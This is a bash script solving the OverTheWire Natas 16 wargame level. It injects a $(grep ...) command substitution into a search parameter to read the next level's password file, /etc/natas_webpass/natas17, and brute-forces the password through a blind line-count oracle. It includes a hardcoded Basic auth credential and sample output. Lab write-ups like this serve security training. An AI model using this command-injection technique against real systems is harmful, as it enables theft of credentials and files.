# Natas 16 --> 17
# PART 1 -- find restricted character set 
# for c in {A..Z} {a..z} {0..9}
# do
# 	curl -s 'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+'$c'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' \
# 	-H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' > output.txt
# 
# 	if [[ $(cat output.txt | wc -l) -lt 300 ]]
# 		then echo "found element $c"
# 	fi
# done

# OUTPUT:
# found element A
# found element G
# found element H
# found element N
# found element P
# found element Q
# found element S
# found element W
# found element b
# found element c
# found element d
# found element g
# found element h
# found element k
# found element m
# found element n
# found element q
# found element r
# found element s
# found element w
# found element 0
# found element 3
# found element 5
# found element 7
# found element 8
# found element 9

# PART 2 Brute force:
char_set="A G H N P Q S W b c d g h k m n q r s w 0 3 5 7 8 9"

for s in $char_set
do
	array=$s
	change=1
	while [ $change == 1 ]
	do
		change=0
		for c in $char_set
		do
			curl -s 'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+'$array$c'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' \
			-H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' > output.txt

			if [[ $(cat output.txt | wc -l) -lt 300 ]]
				then echo "found pattern: $array$c"
				array=$array$c
				change=1
				break
			fi
		done
	done
done
